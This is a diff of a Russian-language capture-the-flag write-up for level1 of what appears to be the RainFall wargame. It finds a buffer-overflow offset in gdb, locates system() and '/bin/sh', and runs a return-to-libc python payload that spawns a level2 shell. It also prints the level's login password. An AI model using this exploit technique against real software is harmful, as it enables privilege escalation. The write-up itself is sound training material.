@@ -1,6 +1,9 @@
 1. Логинимся level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
-2. Исследуем программу. TODO:: Расписать 
+2. Исследуем программу. В этой программе есть буфер, который можно переполнить и с помощью вызвать system(/bin/sh).
+Можно было сделать проще и просто вызвать функцию run, но это было поздно обнаруженно.
 
+
+3. Найдём оффсет
 (gdb) r
 Starting program: /home/user/level1/level1
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
@@ -12,8 +15,9 @@ Program received signal SIGSEGV, Segmentation fault.
 
 offset -> 76
 
-
+4. Найдём адреса system и bin/sh
 system -> 0x08048360
+
 <http://bugs.launchpad.net/gdb-linaro/>...
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) info function system
@@ -60,7 +64,7 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
 
 
-Готовим payload
+5. Подготовим payload и запустим его
 
 system -> 0x08048360
 /bin/sh -> 0xb7f8cc58
@@ -68,14 +72,9 @@ system -> 0x08048360
 offset + system call + padding + string call
 python -c "print 'x'*76 + '\x60\x83\x04\x08'+ '0000'+'\x58\xcc\xf8\xb7'"
 
-Result
+Результат
 
 level1@RainFall:~$ python -c "print 'x'*76 + '\x60\x83\x04\x08'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/l1
-level1@RainFall:~$ cat /tmp/l1 /dev/stdin | ./level1
-whoami
-level2
-
-
 level1@RainFall:~$ cat /tmp/l1 /dev/stdin | ./level1
 whoami
 level2
